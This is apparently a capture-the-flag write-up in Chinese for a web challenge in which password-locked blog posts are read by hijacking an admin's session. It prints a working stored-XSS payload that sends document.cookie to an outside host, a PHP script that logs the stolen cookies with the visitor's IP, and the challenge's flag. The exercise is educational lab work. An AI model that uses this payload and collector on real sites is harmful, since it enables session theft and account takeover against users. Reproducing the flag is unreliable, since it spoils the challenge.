# secure_page_service
這是一個類似部落格的網站，你可以創造文章，然後用密碼鎖起來，flag藏在某個被密碼鎖住的文章裡。
 * 看一下網頁source code，實際創帳號嘗試後，收集到的線索：
  1. 只有admin可以不需要密碼就能看文章，如果能得到他的session_id就能搶到flag
  2. 網站有persistent XSS漏洞：沒有過濾輸入是否是HTML程式碼就存到資料庫裡，然後直接顯示出來
  3. 回報問題，不久admin會來察看你的文章！！
那要怎麼偷呢？
 * 注意到2.讓我們可以把javascript程式碼存到資料庫裡，並且讓這段程式在看文章時執行，所以用javascript取得瀏覽者的cookie，並且將cookie傳送到另一個準備好的網站去。像這樣：
```
</div>
<script>location.href=("http://ulkk1c611e83.lubebul.koding.io/php.php?cookie="+document.cookie)
</script>
```
 * 準備的那個網站，我架在免費雲端平台Koding上，只要把cookie給存下來就偷到囉：
```
<?php
$cookie = $_GET['cookie'];
$userip = getenv('REMOTE_ADDR');
$file = '/home/lubebul/Documents/cookies.txt';
$fout = fopen($file, 'a') or die("cannot create file");
fwrite($fout, 'from ip = '.$userip.', get cookie: '.$cookie);
fclose($fout);
echo "I've stolen your cookie! Hehe~";
?>
```
 * 記得要給文章設密碼，然後回報問題等admin上當
 * 最後在用瀏覽器外掛，編輯cookie的值，成功取得
 Flag: wow_cross_site_scripting_is_such_web
